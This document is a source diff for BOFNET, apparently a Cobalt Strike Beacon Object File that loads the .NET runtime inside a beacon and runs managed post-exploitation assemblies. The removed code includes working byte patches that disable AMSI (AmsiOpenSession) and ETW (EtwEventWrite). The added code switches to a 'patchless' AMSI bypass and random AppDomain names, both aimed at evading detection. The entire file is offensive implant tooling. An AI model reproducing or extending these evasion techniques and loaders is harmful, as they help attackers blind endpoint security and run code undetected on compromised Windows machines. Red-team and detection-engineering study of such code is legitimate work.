@@ -4,6 +4,10 @@
 #include "utils.h"
 
 extern "C"{
+#ifndef _BOF_
+    #undef DECLSPEC_IMPORT
+    #define DECLSPEC_IMPORT
+#endif
     #include "beacon.h"
 }
 
@@ -17,23 +21,27 @@ namespace mscorlib{
     #include "mscorlib.h"
 }
 
+#include "patchless_amsi.h"
+
+
 __CRT_UUID_DECL(mscorlib::_AppDomain, 0x05F696DC, 0x2B29, 0x3663, 0xad, 0x8b, 0xc4, 0x38, 0x9c, 0xf2, 0xa7, 0x13);
 
-const VARIANT vtEmpty{ {{VT_EMPTY, 0, 0, 0, {0}}}};
-const VARIANT vtNull{ {{VT_NULL, 0, 0, 0, {0}}}};
+static const VARIANT vtEmpty{ {{VT_EMPTY, 0, 0, 0, {0}}}};
+static const VARIANT vtNull{ {{VT_NULL, 0, 0, 0, {0}}}};
 
 #define MAX_BOF_NAME 512
+#define MAX_APPDOMAIN_NAME 64
 
-mscorlib::_AppDomain* initialiseChildBOFNETAppDomain(const wchar_t* appDomainName, const char* assemblyData, int len);
+static mscorlib::_AppDomain* initialiseChildBOFNETAppDomain(const wchar_t* appDomainName, const char* assemblyData, int len);
 
 typedef HRESULT WINAPI (*CLRCreateInstancePtr)(REFCLSID clsid, REFIID riid, LPVOID *ppInterface);
 
 //Bug in Cobalt Strike's inline-execute engine.
 //Doens't seem to resolve variables within .bss section (uninitialsed data/initialised to zero).
 //So we force the variable inside the .data section instead
-__attribute__((section(".data")))  ICorRuntimeHost* icrh = nullptr;
+static __attribute__((section(".data")))  ICorRuntimeHost* icrh = nullptr;
 
-mscorlib::_AppDomain* initAppDomain(ICorRuntimeHost* icrh, const wchar_t* appDomainName){
+static mscorlib::_AppDomain* initAppDomain(ICorRuntimeHost* icrh, const wchar_t* appDomainName){
 
     BOF_LOCAL(OLE32, CLSIDFromString);
 
@@ -60,34 +68,71 @@ mscorlib::_AppDomain* initAppDomain(ICorRuntimeHost* icrh, const wchar_t* appDom
     return appDomain;
 }
 
+static char* randString(char *str, size_t size)
+{
+    BOF_LOCAL(msvcrt, rand);
 
-mscorlib::_AppDomain* getAppDomain(ICorRuntimeHost* icrh, const wchar_t* appDomainName){
+    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+    if (size) {
+        --size;
+        for (size_t n = 0; n < size; n++) {
+            int key = rand() % (int) (sizeof charset - 1);
+            str[n] = charset[key];
+        }
+        str[size] = '\0';
+    }
+    return str;
+}
 
-    BOF_LOCAL(msvcrt, wcscmp);
+
+static mscorlib::_AppDomain* getAppDomain(ICorRuntimeHost* icrh, const wchar_t* appDomainName){
+
     BOF_LOCAL(OLE32, CLSIDFromString);
+    BOF_LOCAL(OleAut32, SysAllocString);
+    BOF_LOCAL(msvcrt, wcscmp);
 
     GUID CLSID_AppDomain;
     HRESULT hr;
     HDOMAINENUM hDomainEnum;
     IUnknown* iu = nullptr;
     mscorlib::_AppDomain* appDomain = nullptr;
+    mscorlib::_Assembly* assembly = nullptr;
     bool found = false;
 
     CLSIDFromString(L"{05F696DC-2B29-3663-AD8B-C4389CF2A713}", &CLSID_AppDomain);
 
     hr = icrh->EnumDomains(&hDomainEnum);
 
-    while( (hr = icrh->NextDomain(hDomainEnum, &iu)) == S_OK){
+    while((hr = icrh->NextDomain(hDomainEnum, &iu)) == S_OK){
+
         BSTR friendlyName;
+
+        appDomain = nullptr;
         hr = iu->QueryInterface(CLSID_AppDomain, (LPVOID*)&appDomain);
+
+        if(appDomain == nullptr){
+            iu->Release();
+            continue;
+        }
+
         hr = appDomain->get_FriendlyName(&friendlyName);
 
         if(friendlyName && wcscmp(friendlyName, appDomainName) == 0){
-            found = true;
             iu->Release();
+            found = true;
             break;
         }
+
+        hr = appDomain->Load_2(SysAllocString(L"BOFNET"), &assembly);
+
+        if(assembly == nullptr){
+            iu->Release();
+            continue;
+        }
+
+        found = true;
         iu->Release();
+        break;
     }
 
     iu = nullptr;
@@ -100,7 +145,7 @@ mscorlib::_AppDomain* getAppDomain(ICorRuntimeHost* icrh, const wchar_t* appDoma
     return appDomain;
 }
 
-SAFEARRAY* createVariantSafeArray(int numArgs, va_list argp){
+static SAFEARRAY* createVariantSafeArray(int numArgs, va_list argp){
 
     BOF_LOCAL(OleAut32, SafeArrayCreateVector);
     BOF_LOCAL(OleAut32, SafeArrayPutElement);
@@ -118,7 +163,7 @@ SAFEARRAY* createVariantSafeArray(int numArgs, va_list argp){
 }
 
 
-SAFEARRAY* createVariantSafeArray(int numArgs, ...){
+static SAFEARRAY* createVariantSafeArray(int numArgs, ...){
 
     va_list argp;
     va_start(argp, numArgs);
@@ -128,7 +173,7 @@ SAFEARRAY* createVariantSafeArray(int numArgs, ...){
     return sa;
 }
 
-VARIANT invokeStaticMethod(mscorlib::_Type* type, const BSTR method, int numArgs, ... ){
+static VARIANT invokeStaticMethod(mscorlib::_Type* type, const BSTR method, int numArgs, ... ){
 
     BOF_LOCAL(OleAut32, SafeArrayDestroy);
 
@@ -149,7 +194,7 @@ VARIANT invokeStaticMethod(mscorlib::_Type* type, const BSTR method, int numArgs
     return result;
 }
 
-mscorlib::_Assembly* loadAssembly(mscorlib::_AppDomain* appDomain, const char* data, int len){
+static mscorlib::_Assembly* loadAssembly(mscorlib::_AppDomain* appDomain, const char* data, int len){
 
     BOF_LOCAL(msvcrt, memcpy);
     BOF_LOCAL(OleAut32, SafeArrayCreate);
@@ -166,6 +211,7 @@ mscorlib::_Assembly* loadAssembly(mscorlib::_AppDomain* appDomain, const char* d
     memcpy(sa->pvData, data, sab.cElements);
 
     hr = appDomain->Load_3(sa, &result);
+
     SafeArrayDestroy(sa);
 
     if(result == nullptr){
@@ -175,7 +221,7 @@ mscorlib::_Assembly* loadAssembly(mscorlib::_AppDomain* appDomain, const char* d
     return result;
 }
 
-void logConsole(int type, char* msg, int len){
+static void logConsole(int type, char* msg, int len){
 #ifdef _BOF_
     BeaconOutput(type, msg, len);
 #else
@@ -184,7 +230,7 @@ void logConsole(int type, char* msg, int len){
 }
 
 
-const char* skipWhitespace(const char* str){
+static const char* skipWhitespace(const char* str){
 
     const char* result = str;
 
@@ -194,7 +240,7 @@ const char* skipWhitespace(const char* str){
     return result;
 }
 
-VARIANT createVariantString(const char* str){
+static VARIANT createVariantString(const char* str){
 
     BOF_LOCAL(msvcrt, calloc);
     BOF_LOCAL(OleAut32, SysAllocString);
@@ -213,7 +259,7 @@ VARIANT createVariantString(const char* str){
     return result;
 }
 
-ICorRuntimeHost* loadCLR(bool v4){
+static ICorRuntimeHost* loadCLR(bool v4){
 
     BOF_LOCAL(OLE32, CoInitializeEx);
     BOF_LOCAL(OLE32, CoCreateInstance);
@@ -271,7 +317,7 @@ ICorRuntimeHost* loadCLR(bool v4){
     return result;
 }
 
-VARIANT setupBeaconApiPtrs(){
+static VARIANT setupBeaconApiPtrs(){
 
     BOF_LOCAL(OleAut32, SafeArrayCreate);
     BOF_LOCAL(OleAut32, SafeArrayPutElement);
@@ -303,13 +349,13 @@ VARIANT setupBeaconApiPtrs(){
     return vPtrs;
 }
 
-mscorlib::_AppDomain* initialiseChildBOFNETAppDomain(const wchar_t* appDomainName, const char* assemblyData, int len){
+static mscorlib::_AppDomain* initialiseChildBOFNETAppDomain(const wchar_t* appDomainName, const char* assemblyData, int len){
 
     BOF_LOCAL(OleAut32, SysAllocString);
     BOF_LOCAL(OleAut32, SafeArrayCreate);
     BOF_LOCAL(OleAut32, SafeArrayDestroy);
 
-    mscorlib::_AppDomain* appDomain = getAppDomain(icrh, appDomainName);
+    mscorlib::_AppDomain* appDomain = initAppDomain(icrh, appDomainName);
     mscorlib::_Type* bofnetInitalizerType;
     HRESULT hr = S_FALSE;
 
@@ -348,117 +394,70 @@ mscorlib::_AppDomain* initialiseChildBOFNETAppDomain(const wchar_t* appDomainNam
     return nullptr;
 }
 
-bool patchFunction(const char* name, PVOID address, const char* patch, DWORD patchSize){
-
-    BOF_LOCAL(NTDLL, NtProtectVirtualMemory);
-    BOF_LOCAL(msvcrt, memcpy);
-    BOF_LOCAL(KERNEL32, GetLastError);
-
-    bool result = false;
-
-    if(address != nullptr){
-
-        PVOID protectBase = address;
-        DWORD protectSize = patchSize;
-        DWORD oldProtect = 0;
-
-        if(NT_SUCCESS(NtProtectVirtualMemory((HANDLE)-1, &protectBase, &protectSize, PAGE_EXECUTE_READWRITE, &oldProtect))){
-            memcpy(address, patch, patchSize);
-            NtProtectVirtualMemory((HANDLE)-1, &protectBase, &protectSize, PAGE_EXECUTE_READ, &oldProtect);
-            result = true;
-            log("[+] Patched %s successfully", name);
-        }else{
-            log("[!] Failed to patch %s with error 0x%08x", name, GetLastError());
-        }
-    }
-
-    return result;
-}
-
-void patchAmsiEtw(){
-
-    BOF_LOCAL(KERNEL32, GetModuleHandleA);
-    BOF_LOCAL(KERNEL32, LoadLibraryA);
-    BOF_LOCAL(KERNEL32, GetProcAddress);
-
-    HMODULE amsi = GetModuleHandleA("amsi.dll");
-    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-
-    if(amsi == nullptr)
-        amsi = LoadLibraryA("amsi.dll");
-
-    if(amsi != nullptr){
-
-#ifdef __x86_64
-        patchFunction("AMSI", PVOID(GetProcAddress(amsi, "AmsiOpenSession")), "\x48\x31\xC0", 3);
-#else
-        patchFunction("AMSI", PVOID(GetProcAddress(amsi, "AmsiOpenSession")), "\x31\xC0", 3);
-#endif
-    }else{
-        log("[=] No AMSI available on this system to patch", 0);
-    }
-
-    if(ntdll != nullptr){
-#ifdef __x86_64
-        patchFunction("EtwEventWrite", PVOID(GetProcAddress(ntdll, "EtwEventWrite")), "\xc3", 1);
-        patchFunction("EtwEventWriteTransfer", PVOID(GetProcAddress(ntdll, "EtwEventWriteTransfer")), "\xc3", 1);
-#else
-        patchFunction("EtwEventWrite", PVOID(GetProcAddress(ntdll, "EtwEventWrite")), " \xc2\x14\x00\x00", 4);
-        patchFunction("EtwEventWriteTransfer", PVOID(GetProcAddress(ntdll, "EtwEventWriteTransfer")), " \xc2\x14\x00\x00", 4);
-#endif
-    }
-}
-
-
-extern "C" void go(char* args , int len) {
+static void goWithBypasses(char* args , int len) {
 
     BOF_LOCAL(msvcrt, strcmp);
     BOF_LOCAL(msvcrt, memcpy);
     BOF_LOCAL(msvcrt, strlen);
+    BOF_LOCAL(msvcrt, srand);
     BOF_LOCAL(OleAut32, SysAllocString);
     BOF_LOCAL(OleAut32, SafeArrayCreate);
     BOF_LOCAL(OleAut32, SafeArrayDestroy);
+    BOF_LOCAL(KERNEL32, GetTickCount);
+    BOF_LOCAL(KERNEL32, RemoveVectoredExceptionHandler);
 
     HRESULT                 hr;
     mscorlib::_Assembly*    bofnetAssembly = nullptr;
     mscorlib::_Type*        bofnetInitalizerType = nullptr;
-    char                    bofName[MAX_BOF_NAME];
+    mscorlib::_AppDomain*   bofnetAppDomain = nullptr;
+    char                    bofName[MAX_BOF_NAME] = {0};
+    char                    appDomainName[MAX_APPDOMAIN_NAME] = {0};
+    wchar_t                 appDomainNameWide[MAX_APPDOMAIN_NAME] = {0};
+    int                     managedArgsOffset = 0;
+
+    srand(GetTickCount());
 
     if(len == 0){
         log("[+] No arguments specified for bofnet_execute, don't know what to do!\n", 0);
         return;
     }
 
-    msvcrt$sscanf_s(args, "%s", bofName, sizeof(bofName));
+    int tokens = msvcrt$sscanf_s(args, "%s", bofName, sizeof(bofName));
+
+    if(tokens == 0){
+        log("[!] Input arguments incorrect\n", 0);
+        return;
+    }
+
+    managedArgsOffset = strlen(bofName) + 1;
+    randString(appDomainName, 10);
+    int managedArgsLength = len - managedArgsOffset;
+    toWideChar(appDomainName, appDomainNameWide, sizeof(appDomainNameWide));
 
     icrh = loadCLR(true);
     if(icrh == nullptr){
         return;
     }
 
-    mscorlib::_AppDomain* bofnetAppDomain = getAppDomain(icrh, L"BOFNET");
+    bofnetAppDomain = getAppDomain(icrh, appDomainNameWide);
 
     if(bofnetAppDomain == nullptr){
-        log("[!] Failed to get BOFNET app domain\n", 0);
+        log("[!] Failed to get app domain with name %s\n", appDomainName);
         return;
     }
 
     if(strcmp(bofName, "BOFNET.Bofs.Initializer") == 0){
 
-        patchAmsiEtw();
-
         hr = bofnetAppDomain->Load_2(SysAllocString(L"BOFNET"), &bofnetAssembly);
 
         if(bofnetAssembly == nullptr){
-            int bofnetRuntimeOffset = strlen(bofName) + 1;
-            int bofnetRuntimeSize = len - bofnetRuntimeOffset;
 
-            if(bofnetRuntimeSize == 0){
+            if(managedArgsLength == 0){
                 log("[!] No BOFNET runtime payload supplied, bailing!", 0);
                 return;
             }
 
-            bofnetAssembly = loadAssembly(bofnetAppDomain, args+bofnetRuntimeOffset, bofnetRuntimeSize);
+            bofnetAssembly = loadAssembly(bofnetAppDomain, args+managedArgsOffset, managedArgsLength);
 
             if(bofnetAssembly == nullptr){
                 return;
@@ -468,6 +467,7 @@ extern "C" void go(char* args , int len) {
            log("[=] Looks like the BOFNET runtime is already loaded, ignoring initialize request\n", 0);
            return;
         }
+
     }else if(strcmp(bofName, "BOFNET.Bofs.Shutdown") == 0){
         log("[+] Unloading BOFNET", 0);
         icrh->UnloadDomain(bofnetAppDomain);
@@ -479,7 +479,7 @@ extern "C" void go(char* args , int len) {
         hr = bofnetAppDomain->Load_2(SysAllocString(L"BOFNET"), &bofnetAssembly);
 
         if(bofnetAssembly == nullptr){
-            log("Failed to get BOFNET assembly. Have you run BOFNET.Bofs.Initializer BOF yet? : 0x%x\n", hr);
+            log("[!] Failed to get BOFNET assembly for AppDomain %s. Have you run BOFNET.Bofs.Initializer BOF yet? : 0x%x\n", appDomainName, hr);
             return;
         }
     }
@@ -487,21 +487,19 @@ extern "C" void go(char* args , int len) {
     hr = bofnetAssembly->GetType_2(SysAllocString(L"BOFNET.Runtime"), &bofnetInitalizerType);
 
     if(bofnetInitalizerType == nullptr){
-        log("Failed to get BOFNET.Runtime type: 0x%x\n", hr);
+        log("[!] Failed to get BOFNET.Runtime type: 0x%x\n", hr);
         return;
     }
 
     VARIANT vBeaconApis = setupBeaconApiPtrs();
     VARIANT vBofName = createVariantString(bofName);
-    int bofNameLen = strlen(bofName) + 1;
-    int remainingDataLen = len-(bofNameLen);
 
-    if(args[bofNameLen-1] != '\0' || remainingDataLen == 0){
+    if(args[managedArgsOffset-1] != '\0' || managedArgsLength == 0){
 
         VARIANT cmdLine;
 
-        if(remainingDataLen){
-            cmdLine = createVariantString(skipWhitespace(args + strlen(bofName)));
+        if(managedArgsLength){
+            cmdLine = createVariantString(skipWhitespace(args + managedArgsOffset));
         }
         else{
             cmdLine.vt = VT_BSTR;
@@ -516,13 +514,24 @@ extern "C" void go(char* args , int len) {
         SAFEARRAYBOUND sab;
 
         sab.lLbound   = 0;
-        sab.cElements = remainingDataLen;
+        sab.cElements = managedArgsLength;
         rawData.vt = VT_ARRAY |  VT_UI1;
         rawData.parray = SafeArrayCreate(VT_UI1, 1, &sab);
-        memcpy(rawData.parray->pvData, args+bofNameLen, sab.cElements);
+        memcpy(rawData.parray->pvData, args+managedArgsOffset, sab.cElements);
 
         invokeStaticMethod(bofnetInitalizerType, SysAllocString(L"InvokeBof"), 3, &vBeaconApis, &vBofName, &rawData);
 
         SafeArrayDestroy(rawData.parray);
     }
+}
+
+extern "C" void go(char* args , int len) {
+
+    //Setup our hardware breakpoint on AMSI and the VEH
+    //HANDLE hExHandler = setupBypasses();
+
+    goWithBypasses(args,len);
+
+    //Clear our hardware breakpoints and VEH
+    //clearBypasses(hExHandler);
 }
